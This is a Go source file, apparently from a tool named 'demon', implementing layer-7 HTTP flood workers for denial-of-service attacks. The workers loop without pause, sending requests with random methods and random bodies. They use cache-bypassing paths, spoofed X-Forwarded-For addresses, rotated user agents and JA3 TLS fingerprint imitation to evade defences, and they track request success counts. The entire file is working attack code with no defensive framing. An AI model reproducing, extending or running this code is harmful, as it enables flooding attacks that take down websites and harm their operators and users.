package l7

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/0xTM7/demon/internal/config"
	"github.com/0xTM7/demon/internal/utils"
)

var L7Methods = []config.Method{
	config.MethodGET, config.MethodPOST, config.MethodPUT,
	config.MethodPATCH, config.MethodDELETE, config.MethodHEAD,
	config.MethodOPTIONS, config.MethodTRACE,
}

func NewH1Transport(Cfg *config.DemonConfig) *http.Transport {
	TLS := BuildTLSConfig(Cfg.JA3)
	TLS.ServerName = Cfg.Host

	return &http.Transport{
		TLSClientConfig: TLS,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:          1000,
		MaxIdleConnsPerHost:   1000,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		DisableCompression:    false,
		ForceAttemptHTTP2:     false,
	}
}

func RunH1Worker(Cfg *config.DemonConfig, Stop <-chan struct{}) {
	Client := &http.Client{
		Transport: NewH1Transport(Cfg),
		Timeout:   15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for {
		select {
		case <-Stop:
			return
		default:
			Method := Cfg.Method
			if Method == config.MethodRANDOM {
				Method = L7Methods[rand.Intn(len(L7Methods))]
			}

			Path := CacheBypassPath(Cfg.Path)
			URL := fmt.Sprintf("%s://%s%s", Cfg.Scheme, Cfg.Host, Path)

			var Body io.Reader
			var BodyStr string

			if Method == config.MethodPOST || Method == config.MethodPUT || Method == config.MethodPATCH {
				if Cfg.Body != "" {
					BodyStr = Cfg.Body
				} else {
					BodyStr = utils.RandString(utils.RandInt(64, 512))
				}
				Body = strings.NewReader(BodyStr)
			}

			Req, Err := http.NewRequest(string(Method), URL, Body)
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
				continue
			}

			Headers := BuildHeaders(Cfg, Path)
			for K, V := range Headers {
				Req.Header.Set(K, V)
			}

			if BodyStr != "" {
				Req.Header.Set("Content-Length", fmt.Sprintf("%d", len(BodyStr)))
			}

			Resp, Err := Client.Do(Req)
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
				continue
			}

			N, _ := io.Copy(io.Discard, Resp.Body)
			Resp.Body.Close()

			Cfg.Stats.Requests.Add(1)
			Cfg.Stats.BytesSent.Add(N)
			if Resp.StatusCode < 400 {
				Cfg.Stats.Success.Add(1)
			} else {
				Cfg.Stats.Failed.Add(1)
			}
		}
	}
}

func RunH1TLSRaw(Cfg *config.DemonConfig, Stop <-chan struct{}) {
	Addr := fmt.Sprintf("%s:%d", Cfg.Host, Cfg.Port)
	TLSCfg := BuildTLSConfig(Cfg.JA3)
	TLSCfg.ServerName = Cfg.Host

	for {
		select {
		case <-Stop:
			return
		default:
			Conn, Err := tls.Dial("tcp", Addr, TLSCfg)
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
				time.Sleep(50 * time.Millisecond)
				continue
			}

			Path := CacheBypassPath(Cfg.Path)
			Method := string(Cfg.Method)
			if Cfg.Method == config.MethodRANDOM {
				Method = string(L7Methods[rand.Intn(len(L7Methods))])
			}

			Req := fmt.Sprintf(
				"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nX-Forwarded-For: %s\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n",
				Method, Path, Cfg.Host, utils.Pick(Cfg.UserAgents), utils.RandIP(),
			)

			_, Err = Conn.Write([]byte(Req))
			Conn.Close()

			if Err != nil {
				Cfg.Stats.Failed.Add(1)
			} else {
				Cfg.Stats.Requests.Add(1)
				Cfg.Stats.Success.Add(1)
			}
		}
	}
}
